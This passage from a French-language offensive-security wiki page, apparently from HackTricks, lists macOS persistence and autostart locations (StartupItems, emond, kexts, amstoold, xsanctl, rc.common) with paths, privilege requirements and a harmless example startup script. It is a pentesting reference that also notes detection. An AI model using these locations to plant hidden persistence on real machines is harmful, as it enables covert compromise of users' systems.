<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Je ne trouve pas ce composant sur mon macOS — pour plus d'informations, consultez le compte-rendu

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduit par Apple, **emond** est un mécanisme de journalisation qui semble sous-développé ou peut-être abandonné, et pourtant il reste accessible. Bien qu'il n'apporte pas grand-chose à un administrateur Mac, ce service obscur pourrait servir de méthode de persistance discrète pour des acteurs malveillants, probablement inaperçue par la plupart des administrateurs macOS.

Pour ceux qui en ont connaissance, identifier toute utilisation malveillante de **emond** est simple. Le LaunchDaemon système pour ce service recherche des scripts à exécuter dans un seul répertoire. Pour l'inspecter, la commande suivante peut être utilisée :
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Emplacement

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- root requis
- **Déclencheur**: Avec XQuartz

#### Description & Exploit

XQuartz n'est **plus installé dans macOS**, donc si vous voulez plus d'infos consultez le writeup.

### ~~kext~~

> [!CAUTION]
> C'est tellement compliqué d'installer un kext, même en tant que root, que je ne le considérerai pas comme un moyen d'escape from sandboxes ni même pour persistence (sauf si vous avez un exploit)

#### Emplacement

Pour installer un KEXT comme élément de démarrage, il doit être **installé dans l'un des emplacements suivants** :

- `/System/Library/Extensions`
- Fichiers KEXT intégrés dans le système d'exploitation OS X.
- `/Library/Extensions`
- Fichiers KEXT installés par des logiciels tiers

Vous pouvez lister les fichiers kext actuellement chargés avec :
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Pour plus d'informations sur [**kernel extensions — consultez cette section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Emplacement

- **`/usr/local/bin/amstoold`**
- Requiert root

#### Description & Exploitation

Apparemment le `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` utilisait ce binaire tout en exposant un service XPC... le problème est que le binaire n'existait pas, donc vous pouviez placer quelque chose à cet emplacement et lorsque le service XPC était appelé votre binaire serait exécuté.

Je ne retrouve plus cela sur mon macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Emplacement

- **`/Library/Preferences/Xsan/.xsanrc`**
- Requiert root
- **Trigger** : Quand le service est exécuté (rarement)

#### Description & exploit

Apparemment il n'est pas très courant d'exécuter ce script et je n'ai même pas pu le trouver sur mon macOS, donc si vous voulez plus d'infos consultez le writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Cela ne fonctionne pas dans les versions récentes de macOS**

Il est aussi possible de placer ici **des commandes qui seront exécutées au démarrage.** Exemple d'un script rc.common classique:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Techniques et outils de persistance

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Références

- [2025, l'année de l'Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
